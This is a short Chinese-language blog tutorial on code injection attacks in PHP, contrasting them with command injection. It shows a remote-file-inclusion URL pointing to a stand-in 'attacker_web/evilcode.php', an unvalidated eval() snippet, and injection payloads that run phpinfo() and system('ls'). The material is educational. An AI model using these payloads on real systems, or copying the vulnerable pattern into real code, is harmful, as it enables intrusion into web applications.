---
layout: post
title: 代码注入攻击
---

代码注入攻击(code injection attack)通常是指在应用程序中注入要执行的代码片段。这种类型的攻击利用目标程序没有对不信任的数据进行验证，通常因为缺少对输入输出数据的验证。

代码注入攻击和[命令注入攻击](http://topspeedsnail.com/hack-command-injection-attack/)类似，不同点是，代码注入攻击要实现的功能限制在注入的语言本身。如果攻击者成功注入了PHP代码，那么攻击者只能做PHP可以做的事。命令注入可以利用已有的命令，通常受shell限制。

### 示例1

如果一个PHP应用需要把GET请求参数传入到PHP include()函数，并且没有做输入验证。这是很危险的，因为攻击者可以执行它的邪恶代码：

```
http://something/index.php?page=http://attacker_web/evilcode.php
```

### 示例2 

注意PHP eval()函数的使用，下面的代码没有做输入验证：

{% highlight php %}
$your_var = "your_pi";
$p = $_GET('pi');
eval("\$your_var = \$p;");
{% endhighlight %}

正常使用：

```
/index.php?pi=3.14
```

代码注入攻击：

```
/index.php?pi=3.14; phpinfo()

/index.php?pi=3.14; system('ls')
```

[黑客常用攻击方式汇总](http://topspeedsnail.com/hacker-attack-method/)